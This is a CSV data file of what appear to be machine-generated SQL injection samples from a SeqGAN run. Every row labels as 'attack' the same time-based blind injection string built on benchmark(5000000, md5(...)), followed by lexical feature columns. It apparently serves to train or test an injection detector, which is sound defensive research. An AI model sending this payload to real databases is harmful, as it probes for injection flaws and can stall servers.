label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,0,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,1,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,2,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,3,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,4,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,5,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,6,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,7,73.0,25.0,3.70027359851017,18.0,21.0,26.0,8.0,0.2465753424657534,0.2876712328767123,0.3561643835616438,0.1095890410958904,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,8,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,9,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,10,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,11,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,12,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase2b__time__D__100__V8_B6X__sql_aware__len160__gpre160__reward_on__seed88,13,74.0,26.0,3.7535449858046417,18.0,22.0,26.0,8.0,0.24324324324324326,0.2972972972972973,0.35135135135135137,0.10810810810810811,2.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
